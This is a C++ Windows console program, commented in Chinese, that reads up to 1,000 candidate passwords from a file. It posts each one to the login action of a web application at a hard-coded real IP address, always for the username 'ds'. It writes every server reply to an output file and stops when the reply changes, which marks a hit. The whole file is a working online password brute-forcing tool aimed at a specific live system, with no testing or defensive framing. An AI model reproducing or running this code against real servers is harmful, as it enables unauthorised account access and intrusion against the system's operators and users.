// TestPost.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <windows.h>
#include <wininet.h>
#include <time.h>
#include "MessageHandler.h"

#define MAX_BUFF_SIZE	1024
#define MAX_PWD_COUNT	1000

int _tmain(int argc, _TCHAR* argv[])
{
	// 打开文件失败
	if (!g_MsgHandler.InitInOutFile("in.txt", "out.txt"))
		return 0;

	char szDomain[MAX_BUFF_SIZE] = "202.91.240.36";
	char szURL[MAX_BUFF_SIZE] = "itc/login_isAbledLogin.action";
	char szData[MAX_BUFF_SIZE] = "";

	//char szURL2[MAX_BUFF_SIZE] = "itc/login_isLoginName.action";
	//char szIncludeTime2[MAX_BUFF_SIZE] = "loginName=system2&_=%d";


	char szBufferTemp[MAX_BUFF_SIZE] = "userBean.loginName=ds&userBean.loginPass=%s&userBean.loginServerName=202.91.240.36&_=%d";
	char szBufferTempURL[MAX_BUFF_SIZE];

	int nCount = 0;
	while (nCount++ < MAX_PWD_COUNT)
	{
		char *pSpliceInfo = g_MsgHandler.GetLineFromFile();
		if(NULL == pSpliceInfo)
			return 0;

		memset(szBufferTempURL, 0, sizeof(szBufferTempURL));
		memcpy(szBufferTempURL, szURL, sizeof(szURL));

		unsigned int nTimeStamp =(unsigned int)time(NULL);
		sprintf_s(szData, MAX_BUFF_SIZE, szBufferTemp, pSpliceInfo, nTimeStamp);
		char *pReturnContent = g_MsgHandler.SendMessage(szDomain, szBufferTempURL, szData, 0);

		g_MsgHandler.OutPutLineToFile(pSpliceInfo);
		g_MsgHandler.OutPutLineToFile("\t");
		
		if (NULL == pReturnContent)
		{
			g_MsgHandler.OutPutLineToFile("error!\n");
		}
		else
		{
			g_MsgHandler.OutPutLineToFile(pReturnContent);
			g_MsgHandler.OutPutLineToFile("\n");

			if (strcmp(pReturnContent, "0"))
				return 0;
		}

	}

	return 0;
}
